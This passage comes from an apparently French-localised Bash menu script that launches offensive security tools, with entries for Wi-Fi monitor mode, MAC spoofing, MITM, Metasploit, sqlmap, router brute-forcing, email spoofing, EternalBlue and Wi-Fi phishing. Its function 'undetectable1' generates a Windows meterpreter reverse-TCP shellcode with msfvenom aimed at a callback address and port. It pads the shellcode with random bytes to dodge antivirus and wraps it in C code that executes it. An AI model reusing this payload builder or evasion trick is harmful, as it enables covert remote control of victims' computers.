				echo -e "\e[1;34m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 10 ]]
			then
				echo -e "\e[0;34m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 11 ]]
			then
				echo -e "\e[0;37m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 12 ]]
			then
				echo -e "\e[1;30m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 13 ]]
			then
				echo -e "\e[1;33m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 14 ]]
			then
				echo -e "\e[0;33m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 15 ]]
			then
				echo -e "\e[1;37m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 16 ]]
			then
				echo -e "\e[0;30m" > "$LPATH"/settings/logocolor.txt
			fi		
		fi
	done
}
function undetectable1
{
	LHOST=192.168.1.104
	LPORT=4444
	DIRECTORY="/root/Desktop/shellcode.txt"
	TXT="/root/Desktop/txt.txt"
	#############
	randomshit=$(cat /dev/urandom | tr -dc a-z-A-Z-0-9 | head -c1409)
	msfvenom -p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f c -o "$DIRECTORY"
	echo "unsigned char padding[]=" > "$TXT"
	echo "\"$randomshit\";" >> "$TXT"
	cat "$DIRECTORY" >> "$TXT"
	echo "int main(void) { ((void (*)())buf)();}" >> "$TXT"
	leafpad "$TXT"
}
function main_options
{
	if [[ "$YORNAA" = "0" ]]
	then
		exit
	elif [[ "$YORNAA" = "gate" || "$YORNAA" = "gateway" ]]
	then
		TT=$(ifconfig | grep "$WLANN")
		if [[ "$TT" = "" ]]
		then
			echo -e ""$RS""$WLANN" n'est pas disponible"$CE""
			sleep 2
		else
			GATE=$(find_gateways "$WLANN" interface)
			TTT=$(is_it_an_ip "$GATE")
			if [[ "$TTT" != 1 ]]
			then
				echo -e ""$RS"Impossible de trouver votre passerelle."$CE""
				sleep 2
				echo -e ""$RS"Assurez-vous que vous êtes connecté à un réseau"$CE""
				sleep 2
			else
				echo -e ""$YS"Passerelle trouvée: "$GATE""$CE""
				sleep 1
				xdg-open http://"$GATE"
				BACKL=1
			fi
		fi
	elif [[ "$YORNAA" = "scan" ]]
	then
		if [[ ! -f /usr/bin/arp-scan && ! -f /usr/sbin/arp-scan ]]
		then
			echo -e ""$BS"Installation de arp-scan"$CE""
			install_arp_scan
			clear
		fi
		if [[ -f "$LPATH"/settings/arpin.txt ]]
		then
			read ARPIN < "$LPATH"/settings/arpin.txt
		else
			ARPIN="$WLANN"
		fi
		if [[ "$ARPIN" = "" ]]
		then
			ARPIN="$WLANN"
		fi
		TESTARP=$(ifconfig | grep "$ARPIN")
		if [[ "$TESTARP" = "" ]]
		then
			clear
			echo -e ""$RS"$ARPIN n'a pas été trouvé"$CE""
			sleep 2
			BACKL=1
		else
			ip_scan $ARPIN 2
		fi
	elif [[ "$YORNAA" = "22" ]]
	then
		IFTOPT=$(which iftop)
		if [[ "$IFTOPT" == "" ]]
		then
			apt-get -y install iftop
		fi
		CHECK=$(ifconfig | grep "$iftopint")
		if [[ "$CHECK" = "" ]]
		then
			echo -e ""$RS"L'interface  "$iftopint" est introuvable"
			sleep 2
		else
			xterm -hold -T "Iftop on $iftopint" -e "iftop -n -i $iftopint -b" & disown
			BACKL=1
		fi
	elif [[ "$YORNAA" = "21" ]]
	then
		sqlmap_menu
	elif [[ "$YORNAA" = "19" ]]
	then
		echo -e ""$BS"IP:"$CE" "
		read IPG
		clear
		geolocate_ip "$IPG"
	elif [[ "$YORNAA" = "18" ]]
	then
		browser_exploiting
	elif [[ "$YORNAA" = "m" ]]
	then
		mitmf_hook
	elif [[ "$YORNAA" = "g" ]]
	then
		find_gateways
	elif [[ "$YORNAA" = "l" ]]
	then
		local_ips
	elif [[ "$YORNAA" = "17" ]]
	then
		if [[ ! -f "/usr/local/bin/howdoi" ]]
		then
			echo -e ""$RS"Howdoi n'est pas installé. Tapez '"$CE""$YS"install"$CE""$RS"' pour l'installer."
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_howdoi
			fi
		else
			clear
			if [[ -f "$LPATH"/settings/dispfull.txt ]]
			then
				read dispfull < "$LPATH"/settings/dispfull.txt
				if [[ "$dispfull" = "true" ]]
				then
					df="-a"
				fi
			else
				df=""
			fi
			if [[ -f "$LPATH"/settings/colorout.txt ]]
			then
				read colorout < "$LPATH"/settings/colorout.txt
				if [[ "$colorout" = "true" ]]
				then
					co="-c"
				fi
			else
				co=""
			fi
			if [[ -f "$LPATH"/settings/onlylink.txt ]]
			then
				read onlylink < "$LPATH"/settings/onlylink.txt
				if [[ "$onlylink" = "true" ]]
				then
					ol="-l"
				fi
			else
				ol=""
			fi
			if [[ -f "$LPATH"/settings/numofans.txt ]]
			then
				read numofans < "$LPATH"/settings/numofans.txt
				if [[ "$numofans" = "true" ]]
				then
					na="-n "$numofans""
				fi
			else
				na=""
			fi
			echo -e "Comment puis-je :  "
			read HOW
			howdoi $co $na $ol $df $HOW
		fi
	elif [[ "$YORNAA" = "settings" || "$YORNAA" = "s" ]]
	then
		settings_menu
	elif [[ "$YORNAA" = "16" ]]
	then
		ngrok_option
		BACKL=1
	elif [[ "$YORNAA" = "donate" || "$YORNAA" = "d" ]]
	then
		donate_option
#------services
	elif [[ "$YORNAA" = "pstart" ]]
	then
		service postgresql start && echo -e ""$YS"Fait"$CE"" || echo -e ""$RS"Erreur"$CE""
	elif [[ "$YORNAA" = "pstop" ]]
	then
		service postgresql stop && echo -e ""$YS"Fait"$CE"" || echo -e ""$RS"Erreur"$CE""
	elif [[ "$YORNAA" = "nstart" ]]
	then
		service network-manager start && echo -e ""$YS"Fait"$CE"" || echo -e ""$RS"Erreur"$CE""
	elif [[ "$YORNAA" = "nstop" ]]
	then
		service network-manager stop && echo -e ""$YS"Fait"$CE"" || echo -e ""$RS"Erreur"$CE""
	elif [[ "$YORNAA" = "astart" ]]
	then
		service apache2 start && echo -e ""$YS"Fait"$CE"" || echo -e ""$RS"Erreur"$CE""
	elif [[ "$YORNAA" = "astop" ]]
	then
		service apache2 stop && echo -e ""$YS"Fait"$CE"" || echo -e ""$RS"Erreur"$CE""
	elif [[ "$YORNAA" = "nessusstart" ]]
	then
		if [[ -f /etc/init.d/nessusd ]]
		then
			/etc/init.d/nessusd start && echo -e ""$YS"Fait"$CE"" || echo -e ""$RS"Erreur"$CE""
		else
			echo -e ""$RS"Nessus n'est pas installé."$CE""
			sleep 2
		fi
	elif [[ "$YORNAA" = "nessusstop" ]]
	then
		if [[ -f /etc/init.d/nessusd ]]
		then
			/etc/init.d/nessusd stop && echo -e ""$YS"Fait"$CE"" || echo -e ""$RS"Erreur"$CE""
		else
			echo -e ""$RS"Nessus n'est pas installé."$CE""
			sleep 2
		fi
#-------------
	elif [[ "$YORNAA" = "15" ]]
	then
		BACKL="1"
		spoof_email
	elif [[ "$YORNAA" = "ks" ]]
	then
		keyboard_shortcuts
	elif [[ "$YORNAA" = "interface" ]]
	then
		interface_menu
	elif [[ "$YORNAA" = "9" ]]
	then
		tools_menu
	elif [[ "$YORNAA" = "l" ]]
	then
		clear 
		exec bash "$0"
	elif [[ "$YORNAA" = "gg" ]]
	then
		geany /bin/lscript/l
	elif [[ "$YORNAA" = "1" ]]
	then
		enable_wlan
	elif [[ "$YORNAA" = "d1" ]]
	then
		check_wlans
		if [[ "$WLANCHECKING" = "" ]]
		then
			echo -e ""$RS"Erreur. Impossible de trouver l'interface $WLANN à désactiver."$CE""
		else
			disable_wlan
		fi
	elif [[ "$YORNAA" = "2" ]]
	then
		check_wlans
		if [[ "$WLANCHECKING" = "" ]]
		then
			echo -e ""$RS"Erreur. Impossible de trouver l'interface $WLANN."$CE""
		else
			echo -e "Activation de $WLANNM..."
			echo -e "Killing services..."
			(airmon-ng check kill &> /dev/null && echo -e "Fait." ) || echo -e ""$RS"Erreur pendant le killing services"$YS""
			echo -e "Démarrage du mode moniteur..."
			(airmon-ng start $WLANN &>/dev/null && echo -e "Fait" ) || echo -e "Erreur pendant le démarrage du mode moniteur."
		fi
	elif [[ "$YORNAA" = "d2" ]]
	then
		check_wlans
		if [[ "$WLANMCHECKING" = "" ]]
		then
			echo -e ""$RS"Erreur. Impossible de trouver l'interface $WLANNM."$CE""
		else
			stop_monitor
		fi
	elif [[ "$YORNAA" = "3" ]]
	then
		change_mac
	elif [[ "$YORNAA" = "d3" ]]
	then
		interface_selection
		clear
		echo -e "Modification de l'adresse mac de $MYINT par l'adresse d'origine..."
		ifconfig $MYINT down
		macchanger -p $MYINT
		ifconfig $MYINT up
		echo -e "Fait."
	elif [[ "$YORNAA" = "4" ]]
	then
		if [[ ! -f "/etc/init.d/anonym8.sh" ]]
		then
			echo -e ""$RS"Anonym8 n'est pas installé. Tapez '"$CE""$YS"install"$CE""$RS"' pour l'installer."
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_anonym8
			fi
		else
			echo -e "Activation de anonym8..."
			anonym8 start
			echo -e "Fait."
		fi
	elif [[ "$YORNAA" = "d4" ]]
	then
		if [[ ! -f "/etc/init.d/anonym8.sh" ]]
		then
			echo -e ""$RS"Anonym8 n'est pas installé. Tapez '"$CE""$YS"install"$CE""$RS"' pour l'installer."
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_anonym8
			fi
		else
			echo -e "Désactivation de anonym8..."
			anonym8 stop
			echo -e "Fait."
		fi
	elif [[ "$YORNAA" = "5" ]]
	then
		if [[ ! -f "/usr/bin/anonsurf" ]]
		then
			echo -e ""$RS"Anonsurf n'est pas installé. Tapez '"$CE""$YS"install"$CE""$RS"' pour l'installer."
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_anonsurf
			fi
		else
			echo -e "Activation de anonsurf..."
			anonsurf start
			echo -e "Fait."
		fi
	elif [[ "$YORNAA" = "d5" ]]
	then
		if [[ ! -f "/usr/bin/anonsurf" ]]
		then
			echo -e ""$RS"Anonsurf n'est pas installé. Tapez '"$CE""$YS"install"$CE""$RS"' pour l'installer."
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_anonsurf
			fi
		else
			echo -e "Désactivation de anonsurf..."
			anonsurf stop
			echo -e "Fait."
		fi
	elif [[ "$YORNAA" = "6" ]]
	then
		if [[ ! -f "/usr/bin/anonsurf" ]]
		then
			echo -e ""$RS"Anonsurf n'est pas installé. Tapez '"$CE""$YS"install"$CE""$RS"' pour l'installer."
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_anonsurf
			fi
		else
			echo -e "Statut de anonsurf..."
			anonsurf status
			echo -e "Fait."
		fi
	elif [[ "$YORNAA" = "d6" ]]
	then
		if [[ ! -f "/usr/bin/anonsurf" ]]
		then
			echo -e ""$RS"Anonsurf n'est pas installé. Tapez '"$CE""$YS"install"$CE""$RS"' pour l'installer."
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_anonsurf
			fi
		else
			echo -e "Redémarrage de anonsurf..."
			anonsurf change
			echo -e "Fait."
		fi
	elif [[ "$YORNAA" = "r6" ]]
	then
		if [[ ! -f "/usr/bin/anonsurf" ]]
		then
			echo -e ""$RS"Anonsurf n'est pas installé. Tapez '"$CE""$YS"install"$CE""$RS"' pour l'installer."
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_anonsurf
			fi
		else
			echo -e "Redémarrage de anonsurf..."
			anonym8 change
			echo -e "Fait."
		fi
	elif [[ "$YORNAA" = "7" ]]
	then
		public_ip
	elif [[ "$YORNAA" = "8" ]]
	then
		interface_selection
		clear
		echo "Your MACs: "
		macchanger -s $MYINT
	elif [[ "$YORNAA" = "10" || "$YORNAA" = "11" || "$YORNAA" = "12" ]]
	then
		new_terminal
	elif [[ "$YORNAA" = "13" ]]
	then
		mitm_menu
	elif [[ "$YORNAA" = "14" ]]
	then
		metasploit_menu
	elif [[ "$YORNAA" = "20" ]]
	then
		bruteforce_router
	elif [[ "$YORNAA" = "exit" ]]
	then
		kill -9 $PPID
		exit
	elif [[ "$YORNAA" = "update" ]]
	then
		printf '\033]2;UPDATE\a'
		clear
		update_lscript
	elif [[ "$YORNAA" = "if" || "$YORNAA" = "ifconfig" ]]
	then
		ifconfig
	elif [[ "$YORNAA" = "changelog" ]]
	then
		clear
		BACKL=1
		cat "$LPATH"/lscript-FR/Changelog-FR | head -n 20
		echo -e "$PAKTC"
		$READAK
		clear
	elif [[ "$YORNAA" = "" ]]
	then
		clear
		exec bash "$0"
	elif [[ "$YORNAA" = "errors" ]]
	then
		errors_menu
	elif [[ "$YORNAA" = "etercheck" ]]
	then
		if [[ -d /root/wifiphisher ]]
		then
			eternalblue_check
		else
			echo -e ""$RS"Wifiphisher n'est pas installer. Tapez '"$CE""$YS"install"$CE""$RS"' pour l'installer."$CE""
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_wifiphisher
			fi
		fi
	elif [[ "$YORNAA" = "eternalblue" ]]
	then
		if [[ -d /root/wifiphisher ]]
		then
			eternalblue
		else
			echo -e ""$RS"Wifiphisher n'est pas installer. Tapez '"$CE""$YS"install"$CE""$RS"' pour l'installer."$CE""
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_wifiphisher
			fi
		fi
	elif [[ "$YORNAA" = "$wififb" ]]
	then
		if [[ -d /root/wifiphisher ]]
		then
			wififb_attack
		else
			echo -e ""$RS"Wifiphisher n'est pas installer. Tapez '"$CE""$YS"install"$CE""$RS"' pour l'installer."$CE""
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_wifiphisher
			fi
		fi
	elif [[ "$YORNAA" = "start" ]]
	then		
		start_menu
#----------
	elif [[ "$YORNAA" = "stop" ]]
	then
		stop_menu
	elif [[ "$YORNAA" = "exit" ]]
	then
		clear
		exit
	fi
####check if it is ks
var1=1
check_if_ks
####
}

#----------------TOOLS---------------
	function install_default
	{
		if [[ "$foldname" == "" ]]
		then
			testgit=$(echo "$gitlink" | grep ".git")
			if [[ "$testgit" == "" ]]
			then
				foldname=$(echo "$gitlink" | cut -d '/' -f5)
			else
				foldname=$(echo "$gitlink" | cut -d '/' -f2 | cut -d '.' -f1)
			fi
		fi
		if [[ -d "/root/"$foldname"" ]]
		then
			if [[ "$NOCONFIRM" == 1 ]]
			then
					if [[ "$foldname" != "" ]]
					then
						echo -e ""$YS"Suppression: "$foldname""$CE""
						rm -r /root/"$foldname"
						cd
						git clone $gitlink	
						cd "$foldname"
						return 1
					fi
			else
				echo -e ""$YS"Supprimer l'ancien et installer de nouveau?"$CE" ("$YS"y"$CE"/"$YS"n"$CE")"
				read ROIN
				if [[ "$ROIN" == "y" ]]
				then
					if [[ "$foldname" != "" ]]
					then
						echo -e ""$YS"Suppression: "$foldname""$CE""
						rm -r /root/"$foldname"
						cd
						git clone $gitlink	
						cd "$foldname"
						return 1
					fi
				else
					return 0
				fi
			fi
		else 
			cd
			git clone $gitlink	
			cd "$foldname"
			return 1
		fi
	}
	function install_fluxion
	{
		foldname="fluxion"
		gitlink="--recursive  https://github.com/FluxionNetwork/fluxion.git"
		install_default
		#~ wget https://fluxion.tk/fluxion-unstable.zip
		#~ apt-get install -y unzip
		#~ clear
		#~ unzip /root/fluxion*.zip -d /root
		#~ cd /root/fluxion/install
		#~ chmod +x install.sh
		#~ ./install.sh	
	}
